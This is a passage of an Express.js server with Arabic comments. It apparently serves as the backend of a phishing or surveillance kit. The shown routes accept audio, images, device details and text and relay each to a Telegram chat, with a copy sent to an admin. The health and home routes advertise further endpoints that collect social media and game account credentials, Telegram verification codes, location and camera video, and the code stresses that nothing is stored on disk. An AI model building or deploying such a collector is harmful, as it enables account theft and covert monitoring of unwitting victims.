  } catch (error) {
    console.error('❌ خطأ في /submit-contact:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ في الخادم',
      error: error.message
    });
  }
});

// ================== 🎵 نقطة رفع الصوت ==================
app.post('/upload-audio', upload.single('audio'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ 
                success: false,
                error: 'No audio file provided' 
            });
        }

        const { username, chatId } = req.body;
        
        const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
        let message = `🎵 <b>تم تسجيل صوت جديد</b>\n🕒 <b>الوقت:</b> ${saudiTime}`;
        if (username) message += `\n👤 <b>المستخدم:</b> ${username}`;

        const chatIdToUse = chatId || 'unknown';
        
        const success = await sendToTelegram(
            chatIdToUse, 
            message, 
            req.file.buffer, 
            `audio-${Date.now()}.mp3`
        );
        
        // إرسال نسخة للأدمن
        await sendCopyToAdmin(message, chatIdToUse, req.file.buffer, 'audio.mp3');
        
        if (success) {
            res.status(200).json({ 
                success: true,
                message: 'تم إرسال الصوت إلى Telegram بنجاح',
                data: {
                    timestamp: saudiTime,
                    chatId: chatIdToUse,
                    orderId: `#AUDIO${Math.floor(100000 + Math.random() * 900000)}`
                }
            });
        } else {
            res.status(500).json({ 
                success: false,
                error: 'فشل في إرسال الصوت إلى Telegram' 
            });
        }
    } catch (error) {
        console.error('❌ خطأ في معالجة الصوت:', error);
        res.status(500).json({ 
            success: false,
            error: 'Internal server error' 
        });
    }
});

// ================== 🖼️ نقطة رفع صورة واحدة ==================
app.post('/upload-image', upload.single('image'), async (req, res) => {
  try {
    console.log('📸 استقبال صورة واحدة...');
    
    if (!req.file) {
      return res.status(400).json({
        success: false,
        message: 'لم يتم رفع أي صورة'
      });
    }

    const { username, imageType, chatId, additionalData } = req.body;
    
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    let message = `📸 <b>تم استلام صورة جديدة</b>\n🕒 <b>الوقت:</b> ${saudiTime}`;
    if (username) message += `\n👤 <b>المستخدم:</b> ${username}`;
    if (imageType) message += `\n📸 <b>نوع الصورة:</b> ${imageType}`;
    if (additionalData) message += `\n📝 <b>بيانات إضافية:</b> ${additionalData}`;

    const chatIdToUse = chatId || 'unknown';
    
    // إرسال الصورة كملف
    const success = await sendToTelegram(
      chatIdToUse, 
      message, 
      req.file.buffer, 
      req.file.originalname || `image_${Date.now()}.jpg`
    );
    
    // إرسال نسخة للأدمن
    await sendCopyToAdmin(
      message, 
      chatIdToUse, 
      req.file.buffer, 
      req.file.originalname || `image_${Date.now()}.jpg`, 
      'image'
    );

    console.log('✅ تم معالجة الصورة بنجاح:', {
      chatId: chatIdToUse,
      telegramSent: success
    });

    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال الصورة إلى Telegram بنجاح',
        data: {
          timestamp: saudiTime,
          chatId: chatIdToUse,
          orderId: `#IMG${Math.floor(100000 + Math.random() * 900000)}`
        }
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال الصورة إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('❌ خطأ في معالجة الصورة:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// ================== 📱 نقطة معلومات الجهاز (للفيديو) ==================
app.post('/api/capture/info', async (req, res) => {
  try {
    const { chatId, deviceInfo } = req.body;
    
    console.log('📱 استقبال معلومات جهاز فقط');
    console.log(`   👤 Chat ID: ${chatId}`);
    
    // وقت الاستلام بتوقيت السعودية
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    // تنسيق رسالة Telegram
    const telegramMessage = `
📱 <b>معلومات جهاز للتسجيل</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📱 <b>نوع الطلب:</b> معلومات جهاز فقط

🕒 <b>الوقت:</b> ${saudiTime}

📊 <b>معلومات الجهاز:</b>
<code>${JSON.stringify(deviceInfo || {}, null, 2)}</code>`;

    // إرسال إلى Telegram
    await sendToTelegram(chatId, telegramMessage);
    
    // إرسال نسخة للأدمن
    await sendCopyToAdmin(telegramMessage, chatId);
    
    res.status(200).json({
      success: true,
      message: 'تم استلام معلومات الجهاز وإرسالها بنجاح',
      data: {
        timestamp: saudiTime,
        chatId: chatId,
        orderId: `#DEVINFO${Math.floor(100000 + Math.random() * 900000)}`
      }
    });
    
  } catch (error) {
    console.error('❌ خطأ في استقبال المعلومات:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ================== 📊 نقطة البيانات النصية ==================
app.post('/submitData', async (req, res) => {
  try {
    const { userId, additionalData, message: userMessage } = req.body;

    console.log('📥 استقبال بيانات نصية من:', userId);

    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    // استخدام الرسالة المخصصة أو تنسيق افتراضي
    const finalMessage = userMessage || `
📝 <b>بيانات نصية جديدة</b>

👤 <b>معرف المستخدم:</b> <code>${userId}</code>
🕒 <b>الوقت:</b> ${saudiTime}

📊 <b>البيانات:</b>
<code>${JSON.stringify(additionalData || {}, null, 2)}</code>`;

    const sendResult = await sendToTelegram(userId, finalMessage);

    // إرسال نسخة للأدمن
    await sendCopyToAdmin(finalMessage, userId);

    if (sendResult) {
      console.log('✅ تم إرسال البيانات النصية بنجاح');
      res.json({ 
        success: true, 
        message: 'تم إرسال البيانات النصية بنجاح',
        data: {
          timestamp: saudiTime,
          chatId: userId,
          orderId: `#TEXT${Math.floor(100000 + Math.random() * 900000)}`
        }
      });
    } else {
      res.status(500).json({ 
        success: false, 
        error: 'فشل إرسال البيانات' 
      });
    }

  } catch (error) {
    console.error('❌ خطأ في /submitData:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ================== ❤️ نقطة التحقق من صحة السيرفر ==================
app.get('/health', (req, res) => {
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    res.status(200).json({ 
        success: true,
        status: '✅ السيرفر يعمل بكفاءة عالية!',
        server: 'السيرفر الكامل بكل المميزات',
        tokenConfigured: !!BOT_TOKEN,
        adminId: ADMIN_CHAT_ID,
        environment: process.env.NODE_ENV || 'development',
        timestamp: new Date().toISOString(),
        saudiTime: saudiTime,
        version: '7.0.0 - النسخة النهائية الكاملة',
        features: [
            '🔧 معلومات الجهاز (/SS)',
            '📱 حسابات السوشيال ميديا والألعاب (/send-to-telegram)',
            '🖼️ رفع الصور (/submitPhotos, /upload-image)',
            '🎬 رفع الفيديوهات (/api/capture/record)',
            '📍 بيانات الموقع (/submitLocation)',
            '📲 توثيق تيليجرام (/forward-to-bot)',
            '📝 تسجيل عام (/register)',
            '📞 بيانات الاتصال (/submit-contact)',
            '🎵 رفع الصوت (/upload-audio)',
            '📊 بيانات نصية (/submitData)',
            '👑 نسخة تلقائية للأدمن'
        ],
        endpoints: {
            // 🔧 معلومات الجهاز
            deviceInfo: 'POST /SS',
            
            // 📱 حسابات
            sendToTelegram: 'POST /send-to-telegram',
            telegramAuth: 'POST /forward-to-bot',
            register: 'POST /register',
            
            // 🖼️ صور
            submitPhotos: 'POST /submitPhotos',
            uploadImage: 'POST /upload-image',
            
            // 🎬 فيديو
            videoUpload: 'POST /api/capture/record',
            videoInfo: 'POST /api/capture/info',
            
            // 📍 موقع
            location: 'POST /submitLocation',
            
            // 📞 اتصال
            contact: 'POST /submit-contact',
            
            // 🎵 صوت
            audioUpload: 'POST /upload-audio',
            
            // 📊 بيانات
            submitData: 'POST /submitData',
            
            // ❤️ تحقق
            health: 'GET /health'
        },
        note: '🚀 هذا السيرفر لا يحفظ أي بيانات على القرص - كل شيء يرسل مباشرة إلى Telegram!'
    });
});

// ================== 🏠 الصفحة الرئيسية ==================
app.get('/', (req, res) => {
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    res.status(200).json({ 
        success: true,
        message: '🚀 مرحباً بك في السيرفر الكامل بكل المميزات!',
        version: '7.0.0',
        description: 'سيرفر متكامل يدعم جميع أنواع البيانات والإرسال إلى Telegram',
        adminId: ADMIN_CHAT_ID,
        timestamp: saudiTime,
        mainFeatures: [
            '🔧 معلومات الجهاز الكاملة',
            '📱 حسابات السوشيال ميديا والألعاب',
            '🖼️ رفع الصور والفيديوهات',
            '📍 بيانات الموقع الجغرافي',
            '📲 جميع أنواع التوثيق',
            '👑 إرسال نسخة تلقائية للأدمن'
        ],
        quickStart: {
            deviceInfo: 'POST /SS - لإرسال معلومات الجهاز',
            accounts: 'POST /send-to-telegram - لحسابات السوشيال ميديا والألعاب',
            photos: 'POST /submitPhotos - لرفع الصور',
            video: 'POST /api/capture/record - لرفع الفيديو',
            location: 'POST /submitLocation - لإرسال الموقع',
            health: 'GET /health - للتحقق من الحالة'
        }
    });
});

// ================== تشغيل السيرفر ==================
app.listen(PORT, () => {
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    console.log('='.repeat(80));
    console.log(`🚀🚀🚀 السيرفر الكامل بكل المميزات يعمل على PORT: ${PORT} 🚀🚀🚀`);
    console.log('='.repeat(80));
    console.log('🔧 نقاط معلومات الجهاز والحسابات:');
    console.log(`   📱 معلومات الجهاز: POST /SS`);
    console.log(`   🎮 حسابات الألعاب: POST /send-to-telegram`);
    console.log(`   📱 حسابات السوشيال ميديا: POST /send-to-telegram`);
    console.log('='.repeat(80));
    console.log('🖼️ نقاط رفع الملفات:');
    console.log(`   📸 رفع عدة صور: POST /submitPhotos`);
    console.log(`   🖼️ رفع صورة واحدة: POST /upload-image`);
    console.log(`   🎬 رفع فيديو: POST /api/capture/record`);
    console.log(`   🎵 رفع صوت: POST /upload-audio`);
    console.log('='.repeat(80));
    console.log('📍 نقاط البيانات:');
    console.log(`   🗺️  استقبال الموقع: POST /submitLocation`);
    console.log(`   📲 توثيق تيليجرام: POST /forward-to-bot`);
    console.log(`   📝 تسجيل عام: POST /register`);
    console.log(`   📞 بيانات الاتصال: POST /submit-contact`);
    console.log(`   📊 بيانات نصية: POST /submitData`);
    console.log('='.repeat(80));
    console.log('👑 ميزات متقدمة:');
    console.log(`   • ✅ إرسال مباشر إلى Telegram`);
    console.log(`   • ✅ نسخة تلقائية للأدمن: ${ADMIN_CHAT_ID}`);
    console.log(`   • ✅ لا حفظ بيانات على القرص`);
    console.log(`   • ✅ توقيت السعودية تلقائياً`);
    console.log('='.repeat(80));
    console.log(`❤️  نقطة التحقق: GET /health`);
    console.log(`🆕 الإصدار: 7.0.0 - النسخة النهائية الكاملة`);
    console.log(`🌐 الوقت الحالي: ${saudiTime}`);
    console.log('='.repeat(80));
    
    if (!BOT_TOKEN) {
        console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
    } else {
        console.log('✅ BOT_TOKEN مضبوط بشكل صحيح');
    }
});
